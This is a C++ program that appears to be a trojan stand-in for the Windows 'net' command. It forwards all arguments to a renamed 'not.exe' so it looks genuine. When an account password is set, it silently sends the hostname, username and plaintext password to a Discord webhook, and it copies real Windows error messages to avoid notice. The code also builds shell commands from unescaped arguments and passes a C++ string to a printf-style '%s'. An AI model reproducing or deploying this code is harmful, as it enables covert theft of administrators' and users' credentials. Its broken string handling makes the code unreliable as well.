#include <dpp/dpp.h>
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <cstring>
#include <string>
#include <wininet.h>

void webhook(std::string username, std::string passwd)
{
    dpp::cluster bot(""); // normally, you put your bot token in here. But to just run a webhook its not required

    bot.on_log(dpp::utility::cout_logger());

    /* construct a webhook object using the URL you got from Discord */
    dpp::webhook wh("https://discord.com/api/webhooks/xxxx/xxxx");


    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    std::string hostname = computerName;
    /* send a message with this webhook */
    std::string msg =
        "```Hostname: " + hostname + "\n" 
        "Username: " + username + "\n"
        "Password: " + passwd + "```\n";
    bot.execute_webhook_sync(wh, dpp::message(msg));
}


// this code is from https://vimalshekar.github.io/codesamples/Checking-If-Admin
BOOL IsProcessElevated()
{
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        printf("\n Failed to get Process Token :%d.", GetLastError());
        goto Cleanup;  // if Failed, we treat as False
    }

    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
    {
        printf("\nFailed to get Token Information :%d.", GetLastError());
        goto Cleanup;// if Failed, we treat as False
    }

    fIsElevated = elevation.TokenIsElevated;

Cleanup:
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    return fIsElevated;
}

std::string HideInput()
{
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    DWORD mode = 0;
    GetConsoleMode(hStdin, &mode);
    SetConsoleMode(hStdin, mode & (~ENABLE_ECHO_INPUT));
    std::string passwd;
    getline(std::cin, passwd);
    return passwd;
}

std::string securePasswordChange(char* arg1, char* arg2)
{
    std::cout << "Type a password for the user: ";
    std::string passwd1 = HideInput();
    std::cout << std::endl;
    std::cout << "Retype the password to confirm: ";
    std::string passwd2 = HideInput();
    std::cout << std::endl;


    if (!IsProcessElevated())
    {
        std::cout << "System error 5 has occurred." << std::endl;
        std::cout << std::endl;
        std::cout << "Access is denied." << std::endl;
    }
    else
    {
        if (passwd1 == passwd2)
        {
            // code from chatgpt
            const char* commandFormat = R"(C:\windows\system32\not.exe %s %s %s)";
            char command[256];
            snprintf(command, sizeof(command), commandFormat, arg1, arg2, passwd1);
            system(command);
            std::string username = (std::string)arg2;
            webhook(username, passwd1);
        }
        else
        {
            std::cout << "The passwords do not match." << std::endl;
            std::cout << std::endl;
        }
    }

    return passwd1;
}


int main(int argc, char* argv[]) {
    switch (argc)
    {
        case 1:
        {
            system("C:\\windows\\system32\\not.exe");
            break;
        }
        case 2:
        {
            const char* commandFormat = R"(C:\windows\system32\not.exe %s)";
            char command[256];
            snprintf(command, sizeof(command), commandFormat, argv[1]);
            system(command);
            break;
        }
        case 3:
        {
            const char* commandFormat = R"(C:\windows\system32\not.exe %s %s)";
            char command[256];
            snprintf(command, sizeof(command), commandFormat, argv[1], argv[2]);
            system(command);
            break;
        }
        case 4:
        {
            std::string username = (std::string)argv[2];
            std::string password = (std::string)argv[3];
            if (password == "*")
            {
                std::string pass = securePasswordChange(argv[1], argv[2]);
            }
            else
            {
                std::string arg1 = (std::string)argv[1];
                if (arg1 == "user")
                {
                    webhook(username, password);
                }
                const char* commandFormat = R"(C:\windows\system32\not.exe %s %s %s)";
                char command[256];
                snprintf(command, sizeof(command), commandFormat, argv[1], argv[2], argv[3]);
                system(command);
            }
            break;
        }
        case 5:
        {
            const char* commandFormat = R"(C:\windows\system32\not.exe %s %s %s %s)";
            char command[256];
            snprintf(command, sizeof(command), commandFormat, argv[1], argv[2], argv[3], argv[4]);
            system(command);
            break;
        }
        case 6:
        {
            const char* commandFormat = R"(C:\windows\system32\not.exe %s %s %s %s %s)";
            char command[256];
            snprintf(command, sizeof(command), commandFormat, argv[1], argv[2], argv[3], argv[4], argv[5]);
            system(command);
            break;
        }
        default:
        {
            securePasswordChange(argv[1], argv[2]);
        }  

    }
    return 0;
}